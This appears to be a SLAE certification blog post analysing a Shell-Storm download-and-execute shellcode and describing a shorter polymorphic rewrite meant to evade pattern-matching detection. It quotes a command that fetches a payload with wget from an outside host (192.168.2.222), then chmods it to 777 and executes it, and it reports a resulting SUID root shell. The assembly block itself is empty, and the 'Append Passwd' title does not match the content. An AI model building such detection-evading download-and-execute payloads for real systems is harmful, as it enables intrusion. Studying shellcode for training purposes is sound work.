# Assignment 6: Append Passwd

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger than 150% of the existing shellcode
- Bonus points for making it shorter in length than original

## Solution

In this post we are going to look at the Download and Execute shellcode avaiable at ![http://shell-storm.org/shellcode/files/shellcode-862.php](http://shell-storm.org/shellcode/files/shellcode-862.php "").

### Shellcode Analysis

Tracing the instruction set, we observe that the shellcode first creates a child process (a copy) of itself with the `fork()` system call. The child process is used to download the file that later on is executed by the parent process. Since a child process will return a Process ID of `0`, while the parent process will return a non-zero Process ID, the execution flow is able to determine which instruction set it should execute even though the processes are copies. If PID is zero, the program will go ahead and jump to the download section of the code, where it will use the `execve()` system call to execute `/usr/bin/wget 192.168.2.222//x`. 

While the child process is being executed, the parent process goes on to execute the `waitpid()` system call with PID equal to zero (child process). The  `waitpid()` system  call  suspends execution of the calling process until a child specified by PID argument has changed state. By default, `waitpid()` waits only for terminated children. So, the parent process waits for the download to finish and then goes on to execute the rest of the instructions. 

The parent processs will go on using the `chmod()` system call to execute `chmod 777` on the downloaded file, and then finally proceeds to execute the downloaded file with the `execve()` system call.

It is interesting to note that it was necessary to `fork()` a child in this case because `execve()` does not return execution back to the code that called it. Therefore, by using separate processes for downloading and executing, along with the `waitpid()` functionality, it was possible to execute `execve()` twice from the same shellcode.

### Polymorphic Shellcode

The technique used in the original shellcode sample is entirely replicated in the polymorphic version. Nevertheless, the instruction set is completely rewritten (except for constant strings, such as `/usr/bin/wget` that could of course be used as a fingerprint). Even though Using an encoder would potentially help to remediate the fingerprinting problem to some extent, the shellcode presented here does not include that functionality. It is rather made to be as short as possible.

### a6-dlexec.nasm
```nasm

```


Let us go ahead and check if everything works as it should.

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/dlexec/example.png "Example")

It looks like everything works as expected. The file is correctly downloaded, chmod'ed and executed, giving us a SUID root shell.

Now let's go on to check how the morphed version compares to the original shellcode.

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/dlexec/length.png "Shellcode length")

Our morphed version is 96 bytes in length, which is of course 12 bytes shorter than the original 108 bytes. 




